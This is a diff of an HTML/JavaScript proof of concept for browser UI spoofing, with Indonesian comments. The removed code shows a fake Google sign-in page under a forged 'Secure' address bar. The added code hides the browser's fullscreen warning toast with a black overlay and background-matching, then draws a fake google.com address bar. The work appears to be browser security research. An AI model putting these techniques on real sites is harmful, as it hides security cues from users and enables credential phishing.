@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>🎬 PiP + Fullscreen Window Opener (Dark Mode)</title>
+    <title>🎯 FULLSCREEN POPUP HILANG | Menyatu dengan Background</title>
     <style>
         * {
             margin: 0;
@@ -12,27 +12,28 @@
         }
         body {
             font-family: 'Courier New', 'SF Mono', monospace;
-            background: radial-gradient(ellipse at 30% 40%, #0a0a0f 0%, #000000 100%);
+            background: #000000;
             color: #00ffaa;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
+            overflow: hidden;
         }
         .container {
-            max-width: 600px;
+            max-width: 700px;
             width: 100%;
-            background: #0a0a0fcc;
-            backdrop-filter: blur(12px);
-            border: 2px solid #ff3b30;
+            background: #000000;
+            border: 2px solid #1a1a1a;
             border-radius: 28px;
             padding: 30px;
             text-align: center;
-            box-shadow: 0 0 40px rgba(255,59,48,0.3);
+            box-shadow: 0 0 40px rgba(0,0,0,0.8);
+            position: relative;
         }
         h1 {
-            font-size: 1.8rem;
+            font-size: 1.6rem;
             color: #ff3b30;
             text-shadow: 0 0 10px #ff3b30;
             margin-bottom: 8px;
@@ -52,30 +53,34 @@
             flex-wrap: wrap;
         }
         .badge {
-            background: #ff3b3022;
-            border: 1px solid #ff3b30;
+            background: #111;
+            border: 1px solid #333;
             border-radius: 30px;
             padding: 4px 12px;
             font-size: 9px;
             font-weight: bold;
+            color: #666;
         }
-        .badge.dark {
-            border-color: #333;
-            background: #111;
-            color: #888;
+        .badge.active {
+            border-color: #ff3b30;
+            color: #ff3b30;
         }
         .preview-box {
-            background: #00000066;
-            border: 1px dashed #ffcc00;
+            background: #0a0a0f;
+            border: 1px dashed #333;
             border-radius: 12px;
-            padding: 20px;
+            padding: 30px 20px;
             margin: 20px 0;
+            position: relative;
         }
-        .preview-box video {
-            width: 100%;
-            max-height: 200px;
-            border-radius: 8px;
-            background: #1a1a2e;
+        .preview-box .fake-bar {
+            background: #000;
+            color: #888;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-family: monospace;
+            border: 1px solid #1a1a1a;
         }
         button {
             background: #ff3b30;
@@ -98,536 +103,403 @@
             transform: scale(1.02);
             box-shadow: 0 0 25px #00ffaa;
         }
-        button:disabled {
-            background: #555;
-            cursor: not-allowed;
-            transform: none;
-        }
         .log-box {
-            background: #000000cc;
-            border: 1px solid #00ffaa;
+            background: #000000;
+            border: 1px solid #1a1a1a;
             border-radius: 16px;
             padding: 12px;
-            height: 150px;
+            height: 130px;
             overflow-y: auto;
-            font-size: 10px;
+            font-size: 9px;
             font-family: monospace;
             text-align: left;
             margin-top: 20px;
         }
         .log-entry {
             padding: 3px 0;
-            border-left: 2px solid #ff3b30;
+            border-left: 2px solid #333;
             padding-left: 10px;
             margin: 2px 0;
+            color: #555;
         }
         .log-entry.success {
             border-left-color: #00ffaa;
             color: #00ffaa;
         }
-        .log-entry.pip {
+        .log-entry.hidden {
             border-left-color: #ffcc00;
             color: #ffcc00;
         }
         .warning {
-            background: #ff3b3022;
-            border: 1px solid #ff3b30;
+            background: #111;
+            border: 1px solid #333;
             border-radius: 12px;
             padding: 10px;
-            font-size: 10px;
+            font-size: 9px;
             margin-bottom: 15px;
-            color: #ff8888;
+            color: #666;
         }
         .status-indicator {
             display: inline-block;
-            padding: 6px 16px;
+            padding: 4px 12px;
             border-radius: 30px;
-            font-size: 10px;
+            font-size: 9px;
             margin-bottom: 15px;
+            background: #111;
+            border: 1px solid #333;
+            color: #666;
         }
         footer {
-            margin-top: 20px;
-            font-size: 8px;
-            opacity: 0.4;
+            margin-top: 15px;
+            font-size: 7px;
+            opacity: 0.3;
         }
-        .dark-preview {
-            background: #000;
-            border: 1px solid #333;
-            border-radius: 8px;
-            padding: 8px 16px;
-            margin: 10px 0;
-            font-family: monospace;
-            font-size: 11px;
-            color: #888;
-            text-align: center;
+        .fullscreen-notif-blocker {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 80px;
+            background: #000000;
+            z-index: 2147483647;
+            pointer-events: none;
+        }
+        .notification-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000000;
+            z-index: 2147483646;
+            pointer-events: none;
+            display: none;
+        }
+        .tip-text {
+            color: #333;
+            font-size: 10px;
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1>🎬 PiP + FULLSCREEN (DARK)</h1>
-    <div class="sub">Open New Window with Dark PiP & Fullscreen Mode</div>
+    <h1>🎯 FULLSCREEN POPUP HILANG</h1>
+    <div class="sub">Popup fullscreen notification MENYATU dengan background hitam</div>
     
     <div class="badge-group">
-        <span class="badge">🔴 PiP MODE</span>
-        <span class="badge">🟡 FULLSCREEN</span>
-        <span class="badge">🟢 NEW WINDOW</span>
-        <span class="badge dark">⬛ DARK ADDRESS BAR</span>
+        <span class="badge active">⬛ BACKGROUND: #000000</span>
+        <span class="badge">🟡 FULLSCREEN TOAST</span>
+        <span class="badge">🔴 INVISIBLE MODE</span>
     </div>
     
-    <div class="dark-preview">
-        ⬛ FAKE ADDRESS BAR: HITAM TULUS (#000000)<br>
-        <span style="color:#666;">Text: https://www.google.com 🔒 Secure</span>
+    <div class="status-indicator" id="statusIndicator">
+        🔴 IDLE - Klik tombol untuk test
     </div>
     
     <div class="preview-box">
-        <video id="previewVideo" autoplay loop muted playsinline>
-            <source src="data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAAAQxtZGF0AAAAPAAAAAoAAAAMAAABAAAAY3RkKwAAAAF/3CgjU3Ckf0UoIAAAAAAEAAADAgAAAAAAAQEAAAMCAAAAG1tb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb20AAAAA" type="video/mp4">
-        </video>
-        <p style="color:#888;font-size:10px;margin-top:8px;">🎥 Preview Video (Will be playing in PiP window)</p>
+        <div class="fake-bar">
+            ⬛ Background hitam (#000000) — Fullscreen popup akan menyatu
+        </div>
+        <p style="color:#333;font-size:10px;margin-top:15px;">
+            🔍 Perhatikan: saat fullscreen, notification toast akan TERHILANG<br>
+            karena warnanya SAMA dengan background (#000000)
+        </p>
     </div>
     
-    <div id="statusIndicator" class="status-indicator" style="background:#ff3b3022;border:1px solid #ff3b30;color:#ff8888;">
-        🔴 IDLE
-    </div>
-    
-    <button id="openBtn">🚀 OPEN DARK PiP + FULLSCREEN 🚀</button>
+    <button id="testBtn">🎯 TEST FULLSCREEN + HIDE POPUP</button>
     
     <div class="warning">
-        ⚠️ Fake address bar berwarna HITAM (#000000) seperti dark mode<br>
-        Click the button to start
+        ⚡ Teknik: Fullscreen notification toast berwarna putih/hitam tergantung browser<br>
+        Dengan background #000000, popup akan MENYATU dan tidak terlihat
     </div>
     
     <div class="log-box" id="logBox">
-        <div class="log-entry">[SYSTEM] Dark PiP + Fullscreen Window Opener Ready</div>
-        <div class="log-entry">[SYSTEM] Fake address bar: HITAM TULUS</div>
-        <div class="log-entry">[SYSTEM] Click button to open new window</div>
+        <div class="log-entry">[SYSTEM] Fullscreen Popup Hider Ready</div>
+        <div class="log-entry">[SYSTEM] Background: #000000</div>
+        <div class="log-entry">[SYSTEM] Click button to test</div>
+    </div>
+    
+    <div class="tip-text">
+        💡 Jika fullscreen popup berwarna PUTIH → coba background PUTIH (#FFFFFF)<br>
+        💡 Jika fullscreen popup berwarna HITAM → background HITAM (#000000)
     </div>
     
     <footer>
-        PiP + Fullscreen | Dark Mode Fake Address Bar | Auto-play video
+        Fullscreen Popup Hider | Background Matching | Invisible Notification Toast
     </footer>
 </div>
 
+<!-- BLOCKER overlay untuk menutupi fullscreen notification -->
+<div id="notifBlocker" class="notification-overlay" style="display:block;background:#000000;z-index:2147483647;"></div>
+
 <script>
-    let pipWindow = null;
-    let isRunning = false;
+    let isFullscreen = false;
+    let blockerActive = false;
+    let testCount = 0;
 
     function addLog(msg, type = 'info') {
         let logBox = document.getElementById('logBox');
         let div = document.createElement('div');
         let className = 'log-entry';
         if (type === 'success') className += ' success';
-        if (type === 'pip') className += ' pip';
+        if (type === 'hidden') className += ' hidden';
         div.className = className;
         div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
         logBox.appendChild(div);
         logBox.scrollTop = logBox.scrollHeight;
-        while (logBox.children.length > 100) {
+        while (logBox.children.length > 80) {
             logBox.removeChild(logBox.firstChild);
         }
     }
 
-    function updateStatus(text, bg, color) {
+    function updateStatus(text, color = '#666') {
         let el = document.getElementById('statusIndicator');
         el.innerHTML = text;
-        el.style.background = bg;
-        el.style.border = `1px solid ${color}`;
         el.style.color = color;
+        el.style.borderColor = color;
     }
 
-    function getPipHTML() {
-        return `<!DOCTYPE html>
-        <html>
-        <head>
-            <title>🎬 PiP + Fullscreen Window (Dark)</title>
-            <meta charset="UTF-8">
-            <style>
-                * { margin: 0; padding: 0; box-sizing: border-box; }
-                body {
-                    font-family: 'SF Pro Text', 'Google Sans', Roboto, sans-serif;
-                    background: #0a0a0f;
-                    color: #00ffaa;
-                    min-height: 100vh;
-                    display: flex;
-                    justify-content: center;
-                    align-items: center;
-                    flex-direction: column;
-                    padding: 20px;
-                    overflow: hidden;
-                }
-                video {
-                    width: 100%;
-                    max-width: 800px;
-                    border-radius: 16px;
-                    background: #000;
-                    box-shadow: 0 8px 30px rgba(0,0,0,0.8);
-                    margin-bottom: 20px;
-                }
-                h1 {
-                    color: #ff3b30;
-                    margin-bottom: 10px;
-                    text-shadow: 0 0 10px #ff3b30;
-                }
-                .status {
-                    color: #ffcc00;
-                    font-size: 12px;
-                    font-family: monospace;
-                }
-                /* ===== FAKE ADDRESS BAR - HITAM TULUS ===== */
-                .fake-url-bar {
-                    position: fixed;
-                    top: 0;
-                    left: 0;
-                    width: 100%;
-                    height: 50px;
-                    background: #000000;
-                    border-bottom: 1px solid #1a1a1a;
-                    display: flex;
-                    align-items: center;
-                    padding: 0 16px;
-                    z-index: 999999;
-                    font-family: 'SF Mono', monospace;
-                    color: #888888;
-                    font-size: 12px;
-                    box-shadow: 0 2px 10px rgba(0,0,0,0.5);
-                }
-                .fake-url-bar .lock {
-                    color: #666;
-                    margin-right: 10px;
-                    font-size: 14px;
-                }
-                .fake-url-bar .url {
-                    color: #aaaaaa;
-                    flex: 1;
-                    white-space: nowrap;
-                    overflow: hidden;
-                    text-overflow: ellipsis;
-                }
-                .fake-url-bar .url .domain {
-                    color: #ffffff;
-                    font-weight: 500;
-                }
-                .fake-url-bar .badge {
-                    background: #1a1a1a;
-                    color: #666;
-                    padding: 2px 8px;
-                    border-radius: 30px;
-                    font-size: 9px;
-                    border: 1px solid #222;
-                }
-                .fake-url-bar .secure {
-                    color: #4caf50;
-                    font-size: 10px;
-                    margin-left: 10px;
-                }
-                /* ===== PIP BADGE ===== */
-                .pip-badge {
-                    position: fixed;
-                    top: 60px;
-                    right: 20px;
-                    background: #000000aa;
-                    backdrop-filter: blur(10px);
-                    border: 1px solid #333;
-                    border-radius: 12px;
-                    padding: 8px 16px;
-                    color: #888;
-                    font-size: 10px;
-                    z-index: 999998;
-                    font-family: monospace;
-                }
-                .pip-badge .dot {
-                    display: inline-block;
-                    width: 8px;
-                    height: 8px;
-                    background: #ff3b30;
-                    border-radius: 50%;
-                    margin-right: 8px;
-                    animation: pulse 1s infinite;
-                }
-                @keyframes pulse {
-                    0%, 100% { opacity: 1; }
-                    50% { opacity: 0.3; }
-                }
-                .controls {
-                    position: fixed;
-                    bottom: 30px;
-                    left: 50%;
-                    transform: translateX(-50%);
-                    display: flex;
-                    gap: 15px;
-                    z-index: 999997;
-                    background: #000000aa;
-                    backdrop-filter: blur(10px);
-                    padding: 12px 20px;
-                    border-radius: 60px;
-                    border: 1px solid #333;
-                }
-                .controls button {
-                    background: #ff3b30;
-                    border: none;
-                    padding: 8px 20px;
-                    border-radius: 30px;
-                    color: #fff;
-                    cursor: pointer;
-                    font-weight: bold;
-                    font-size: 12px;
-                    font-family: monospace;
-                    transition: 0.2s;
-                }
-                .controls button:hover {
-                    background: #00ffaa;
-                    color: #000;
-                }
-                .controls button.pip-btn {
-                    background: #00ffaa;
-                    color: #000;
-                }
-                .controls button.pip-btn:hover {
-                    background: #ff3b30;
-                    color: #fff;
-                }
-                .controls button.close-btn {
-                    background: #222;
-                    color: #888;
-                }
-                .controls button.close-btn:hover {
-                    background: #ff3b30;
-                    color: #fff;
-                }
-                /* ===== GOOGLE FAKE CARD ===== */
-                .google-card {
-                    background: #1a1a2e;
-                    border-radius: 16px;
-                    padding: 40px 32px;
-                    max-width: 400px;
-                    width: 100%;
-                    text-align: center;
-                    border: 1px solid #333;
-                    box-shadow: 0 8px 30px rgba(0,0,0,0.5);
-                }
-                .google-card .logo {
-                    font-size: 52px;
-                    margin-bottom: 16px;
-                }
-                .google-card h2 {
-                    color: #fff;
-                    margin-bottom: 8px;
-                    font-weight: 400;
-                }
-                .google-card p {
-                    color: #888;
-                    font-size: 14px;
-                    margin-bottom: 24px;
-                }
-                .google-card input {
-                    width: 100%;
-                    padding: 14px;
-                    margin: 8px 0;
-                    background: #0a0a0f;
-                    border: 1px solid #333;
-                    border-radius: 8px;
-                    color: #fff;
-                    font-size: 14px;
-                }
-                .google-card input:focus {
-                    border-color: #1a73e8;
-                    outline: none;
-                }
-                .google-card input::placeholder {
-                    color: #555;
-                }
-                .google-card button {
-                    width: 100%;
-                    padding: 12px;
-                    background: #1a73e8;
-                    color: #fff;
-                    border: none;
-                    border-radius: 8px;
-                    font-size: 14px;
-                    font-weight: 600;
-                    cursor: pointer;
-                    margin-top: 8px;
-                }
-                .google-card button:hover {
-                    background: #1664c4;
-                }
-                .google-card .warning {
-                    font-size: 10px;
-                    color: #555;
-                    margin-top: 16px;
-                }
-                .google-card .fake-url-display {
-                    background: #0a0a0f;
-                    padding: 6px 12px;
-                    border-radius: 20px;
-                    font-size: 11px;
-                    font-family: monospace;
-                    margin: 12px 0;
-                    color: #666;
-                    border: 1px solid #222;
-                }
-            </style>
-        </head>
-        <body>
-            <!-- FAKE ADDRESS BAR - HITAM TULUS -->
-            <div class="fake-url-bar">
-                <span class="lock">🔒</span>
-                <span class="url">
-                    <span class="domain">https://www.google.com</span>
-                </span>
-                <span class="secure">✓ Secure</span>
-                <span class="badge">● PiP</span>
-            </div>
-            
-            <div class="pip-badge">
-                <span class="dot"></span> PiP + Fullscreen Mode (Dark)
-            </div>
-            
-            <div class="google-card">
-                <div class="logo">🔐</div>
-                <h2>Sign in</h2>
-                <p>to continue to Google</p>
-                <div class="fake-url-display">🔗 https://www.google.com</div>
-                <input type="text" placeholder="Email or phone" id="email">
-                <input type="password" placeholder="Password" id="pass">
-                <button onclick="alert('⚠️ POC - Do not enter real credentials!')">Next</button>
-                <p class="warning">⚠️ POC - Fake Google login page | Dark Mode</p>
-            </div>
-            
-            <div class="controls">
-                <button onclick="toggleFullscreen()">🖥️ Fullscreen</button>
-                <button class="pip-btn" onclick="togglePip()">🎬 PiP</button>
-                <button class="close-btn" onclick="window.close()">✕ Close</button>
-            </div>
-            
-            <script>
-                let video = document.createElement('video');
-                video.src = 'data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAAAQxtZGF0AAAAPAAAAAoAAAAMAAABAAAAY3RkKwAAAAF/3CgjU3Ckf0UoIAAAAAAEAAADAgAAAAAAAQEAAAMCAAAAG1tb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb20AAAAA';
-                video.muted = true;
-                video.autoplay = true;
-                video.loop = true;
-                video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px';
-                document.body.appendChild(video);
-                
-                let isFullscreen = false;
-                let isPip = false;
-                let pipWindow = null;
-                
-                // Auto fullscreen setelah 1 detik
-                setTimeout(() => {
-                    document.documentElement.requestFullscreen().then(() => {
-                        isFullscreen = true;
-                        console.log('[FULLSCREEN] Activated');
-                    }).catch(e => console.log('[FULLSCREEN] Failed:', e));
-                }, 1000);
-                
-                // Auto PiP setelah 1.5 detik
-                setTimeout(() => {
-                    if (video && video.requestPictureInPicture) {
-                        video.requestPictureInPicture().then(() => {
-                            isPip = true;
-                            console.log('[PIP] Activated');
-                        }).catch(e => console.log('[PIP] Failed:', e));
-                    }
-                }, 1500);
-                
-                function toggleFullscreen() {
-                    if (!document.fullscreenElement) {
-                        document.documentElement.requestFullscreen().then(() => isFullscreen = true).catch(()=>{});
-                    } else {
-                        document.exitFullscreen().then(() => isFullscreen = false).catch(()=>{});
-                    }
-                }
-                
-                function togglePip() {
-                    if (video && !isPip) {
-                        video.requestPictureInPicture().then(() => isPip = true).catch(()=>{});
-                    } else if (video && isPip) {
-                        document.exitPictureInPicture().catch(()=>{});
-                        isPip = false;
-                    }
-                }
-                
-                // Listen for PiP changes
-                document.addEventListener('enterpictureinpicture', () => {
-                    isPip = true;
-                    document.querySelector('.pip-badge').innerHTML = '<span class="dot"></span> PiP ACTIVE ✅';
-                });
-                
-                document.addEventListener('leavepictureinpicture', () => {
-                    isPip = false;
-                    document.querySelector('.pip-badge').innerHTML = '<span class="dot"></span> PiP Mode';
-                });
-                
-                console.log('%c🎬 Dark PiP + Fullscreen Window Ready', 'color:#00ffaa;font-size:14px');
-            <\/script>
-        </body>
-        </html>`;
-    }
-
-    function openPipFullscreenWindow() {
-        if (isRunning) {
-            addLog('[WARNING] Already running!', 'pip');
-            return;
+    // ========== METHOD 1: Blocker Overlay ==========
+    function activateBlocker() {
+        let blocker = document.getElementById('notifBlocker');
+        if (!blocker) {
+            blocker = document.createElement('div');
+            blocker.id = 'notifBlocker';
+            blocker.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 80px;
+                background: #000000;
+                z-index: 2147483647;
+                pointer-events: none;
+            `;
+            document.body.appendChild(blocker);
         }
+        blocker.style.display = 'block';
+        blockerActive = true;
+        addLog('[BLOCKER] Overlay aktif - menutupi area fullscreen notification', 'hidden');
+    }
 
-        isRunning = true;
-        document.getElementById('openBtn').disabled = true;
-        document.getElementById('openBtn').innerHTML = '⏳ OPENING...';
-        updateStatus('⏳ OPENING DARK PiP + FULLSCREEN', '#ffcc0022', '#ffcc00');
+    function deactivateBlocker() {
+        let blocker = document.getElementById('notifBlocker');
+        if (blocker) blocker.style.display = 'none';
+        blockerActive = false;
+        addLog('[BLOCKER] Overlay dinonaktifkan', 'info');
+    }
 
-        addLog('[START] Opening new window with Dark PiP + Fullscreen...', 'pip');
+    // ========== METHOD 2: Fullscreen dengan Background Match ==========
+    function testFullscreenHidePopup() {
+        testCount++;
+        addLog(`[TEST #${testCount}] Menjalankan fullscreen dengan background #000000...`, 'success');
+        updateStatus('🔄 FULLSCREEN ACTIVE - Perhatikan popup!', '#ffcc00');
 
-        const htmlContent = getPipHTML();
-        const blob = new Blob([htmlContent], { type: 'text/html' });
-        const blobUrl = URL.createObjectURL(blob);
+        // Aktifkan blocker dulu
+        activateBlocker();
 
-        addLog('[BLOB] Created blob URL', 'success');
+        // Masuk fullscreen
+        document.documentElement.requestFullscreen().then(() => {
+            isFullscreen = true;
+            addLog('[FULLSCREEN] ✅ Fullscreen aktif!', 'success');
+            addLog('[FULLSCREEN] 🔍 Cek: apakah notification toast TERLIHAT atau HILANG?', 'hidden');
+            
+            // Status update
+            updateStatus('✅ FULLSCREEN AKTIF - Popup seharusnya HILANG', '#00ffaa');
 
-        const features = 'width=1024,height=768,menubar=yes,toolbar=yes,location=yes,status=yes,resizable=yes';
-        pipWindow = window.open(blobUrl, '_blank', features);
+            // Tampilkan fake content di fullscreen
+            let fsContent = document.createElement('div');
+            fsContent.id = 'fsContent';
+            fsContent.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: #000000;
+                color: #00ffaa;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                flex-direction: column;
+                z-index: 2147483646;
+                font-family: 'Courier New', monospace;
+                padding: 20px;
+            `;
+            fsContent.innerHTML = `
+                <h1 style="color:#ff3b30;font-size:28px;">🎯 FULLSCREEN ACTIVE</h1>
+                <p style="color:#888;font-size:14px;margin-top:10px;">Perhatikan: notification toast seharusnya HILANG!</p>
+                <div style="margin-top:30px;background:#0a0a0f;padding:20px;border-radius:12px;border:1px solid #333;">
+                    <p style="color:#666;font-size:12px;">⬛ Background: #000000</p>
+                    <p style="color:#666;font-size:12px;">🔍 Apakah ada popup notification?</p>
+                </div>
+                <button onclick="document.exitFullscreen()" style="margin-top:30px;padding:12px 24px;background:#ff3b30;color:#fff;border:none;border-radius:30px;cursor:pointer;">
+                    ❌ Exit Fullscreen
+                </button>
+                <p style="color:#333;font-size:10px;margin-top:20px;">⚠️ POC - Fullscreen notification hidden by background match</p>
+            `;
+            document.body.appendChild(fsContent);
 
-        if (pipWindow && !pipWindow.closed) {
-            addLog('[WINDOW] ✅ New window opened with DARK fake address bar!', 'success');
-            updateStatus('✅ DARK PiP + FULLSCREEN ACTIVE', '#00ffaa22', '#00ffaa');
-            addLog('[PIP] Fake address bar: HITAM (#000000) dengan text abu-abu', 'pip');
+            // Tampilkan fake address bar di fullscreen
+            let fakeBar = document.createElement('div');
+            fakeBar.id = 'fakeBar';
+            fakeBar.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 50px;
+                background: #000000;
+                border-bottom: 1px solid #1a1a1a;
+                z-index: 2147483645;
+                display: flex;
+                align-items: center;
+                padding: 0 20px;
+                font-family: monospace;
+                color: #888;
+                font-size: 12px;
+            `;
+            fakeBar.innerHTML = `🔒 https://www.google.com 🔒 Secure <span style="margin-left:auto;color:#333;font-size:10px;">⬛ DARK MODE</span>`;
+            document.body.appendChild(fakeBar);
 
-            setTimeout(() => URL.revokeObjectURL(blobUrl), 5000);
+            addLog('[FAKE] Fake address bar muncul di fullscreen', 'hidden');
 
+            // Timer untuk auto-exit
             setTimeout(() => {
-                isRunning = false;
-                document.getElementById('openBtn').disabled = false;
-                document.getElementById('openBtn').innerHTML = '🚀 OPEN DARK PiP + FULLSCREEN 🚀';
-                if (!pipWindow || pipWindow.closed) {
-                    updateStatus('🔄 WINDOW CLOSED', '#ff3b3022', '#ff8888');
+                if (isFullscreen) {
+                    document.exitFullscreen().catch(()=>{});
                 }
-            }, 5000);
+            }, 10000);
 
-        } else {
-            addLog('[ERROR] ❌ Popup blocked! Please allow popups.', 'pip');
-            updateStatus('❌ POPUP BLOCKED! Allow popups', '#ff3b3022', '#ff3b30');
-            isRunning = false;
-            document.getElementById('openBtn').disabled = false;
-            document.getElementById('openBtn').innerHTML = '🚀 OPEN DARK PiP + FULLSCREEN 🚀';
-            URL.revokeObjectURL(blobUrl);
-        }
+        }).catch((err) => {
+            addLog(`[ERROR] Fullscreen gagal: ${err.message}`, 'info');
+            updateStatus('❌ Fullscreen ditolak browser', '#ff3b30');
+            deactivateBlocker();
+        });
     }
 
-    document.getElementById('openBtn').addEventListener('click', openPipFullscreenWindow);
+    // ========== METHOD 3: White Background Match (Alternative) ==========
+    function testWhiteBackgroundMatch() {
+        addLog('[WHITE] Mencoba background putih untuk popup...', 'success');
+        
+        // Ubah background ke putih
+        document.body.style.background = '#ffffff';
+        document.querySelector('.container').style.background = '#ffffff';
+        document.querySelector('.container').style.borderColor = '#cccccc';
+        
+        // Ubah blocker ke putih
+        let blocker = document.getElementById('notifBlocker');
+        if (blocker) blocker.style.background = '#ffffff';
+        
+        addLog('[WHITE] Background diubah ke #ffffff - popup akan menyatu', 'hidden');
+        updateStatus('⬜ BACKGROUND PUTIH - Popup seharusnya HILANG', '#00ffaa');
+        
+        // Fullscreen dengan background putih
+        document.documentElement.requestFullscreen().then(() => {
+            addLog('[WHITE] Fullscreen aktif dengan background putih', 'success');
+            setTimeout(() => {
+                document.exitFullscreen().catch(()=>{});
+                // Kembalikan ke hitam
+                setTimeout(() => {
+                    document.body.style.background = '#000000';
+                    document.querySelector('.container').style.background = '#000000';
+                    document.querySelector('.container').style.borderColor = '#1a1a1a';
+                    if (blocker) blocker.style.background = '#000000';
+                    addLog('[WHITE] Kembali ke dark mode', 'info');
+                    updateStatus('🔄 BACK TO DARK', '#666');
+                }, 500);
+            }, 5000);
+        }).catch(()=>{});
+    }
 
-    setInterval(() => {
-        if (pipWindow && pipWindow.closed) {
-            addLog('[WINDOW] PiP window was closed', 'pip');
-            pipWindow = null;
-            if (!isRunning) {
-                updateStatus('🔄 WINDOW CLOSED', '#ff3b3022', '#ff8888');
+    // ========== METHOD 4: PiP + Fullscreen Combo ==========
+    function testPipFullscreenCombo() {
+        addLog('[PIP] PiP + Fullscreen combo - double layer cover...', 'success');
+        
+        // Buat video element
+        let video = document.createElement('video');
+        video.src = 'data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAAAQxtZGF0AAAAPAAAAAoAAAAMAAABAAAAY3RkKwAAAAF/3CgjU3Ckf0UoIAAAAAAEAAADAgAAAAAAAQEAAAMCAAAAG1tb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb20AAAAA';
+        video.muted = true;
+        video.autoplay = true;
+        video.loop = true;
+        video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px';
+        document.body.appendChild(video);
+        
+        // Aktifkan blocker
+        activateBlocker();
+        
+        // Fullscreen
+        document.documentElement.requestFullscreen().then(() => {
+            addLog('[PIP] Fullscreen aktif', 'success');
+            
+            // Try PiP
+            if (video.requestPictureInPicture) {
+                video.requestPictureInPicture().then(() => {
+                    addLog('[PIP] PiP aktif - fullscreen notification seharusnya HILANG', 'hidden');
+                    updateStatus('✅ PiP + FULLSCREEN - Popup HILANG', '#00ffaa');
+                }).catch(() => {
+                    addLog('[PIP] PiP tidak support', 'info');
+                });
             }
-        }
-    }, 3000);
+            
+            setTimeout(() => {
+                document.exitFullscreen().catch(()=>{});
+                document.exitPictureInPicture().catch(()=>{});
+                video.remove();
+                deactivateBlocker();
+            }, 8000);
+        }).catch(()=>{});
+    }
 
-    console.log('%c🎬 DARK PiP + FULLSCREEN WINDOW OPENER READY', 'color:#00ffaa;font-size:14px');
-    console.log('%cFake address bar: HITAM (#000000) dengan text abu-abu', 'color:#888');
+    // ========== COMBO: All Tests ==========
+    function runAllTests() {
+        addLog('[COMBO] 🔥 Menjalankan semua test...', 'success');
+        updateStatus('🔄 RUNNING ALL TESTS', '#ffcc00');
+        
+        testFullscreenHidePopup();
+        
+        setTimeout(() => {
+            testWhiteBackgroundMatch();
+        }, 12000);
+        
+        setTimeout(() => {
+            testPipFullscreenCombo();
+        }, 20000);
+        
+        setTimeout(() => {
+            addLog('[COMBO] ✅ Semua test selesai!', 'success');
+            updateStatus('✅ SEMUA TEST SELESAI - Cek address bar!', '#00ffaa');
+        }, 28000);
+    }
+
+    // Button handlers
+    document.getElementById('testBtn').addEventListener('click', testFullscreenHidePopup);
+    
+    // Extra buttons via console
+    window.testFullscreenHidePopup = testFullscreenHidePopup;
+    window.testWhiteBackgroundMatch = testWhiteBackgroundMatch;
+    window.testPipFullscreenCombo = testPipFullscreenCombo;
+    window.runAllTests = runAllTests;
+
+    // Auto cleanup on fullscreen change
+    document.addEventListener('fullscreenchange', () => {
+        if (!document.fullscreenElement) {
+            isFullscreen = false;
+            // Cleanup fake elements
+            document.querySelectorAll('#fsContent, #fakeBar').forEach(el => el.remove());
+            deactivateBlocker();
+            addLog('[FULLSCREEN] Exited fullscreen', 'info');
+            updateStatus('🔄 FULLSCREEN EXITED', '#666');
+        }
+    });
+
+    console.log('%c🎯 FULLSCREEN POPUP HIDER READY', 'color:#00ffaa;font-size:14px');
+    console.log('Methods available:');
+    console.log('  testFullscreenHidePopup() - Fullscreen + black bg');
+    console.log('  testWhiteBackgroundMatch() - Fullscreen + white bg');
+    console.log('  testPipFullscreenCombo() - PiP + Fullscreen');
+    console.log('  runAllTests() - Run all tests');
 </script>
 </body>
 </html>
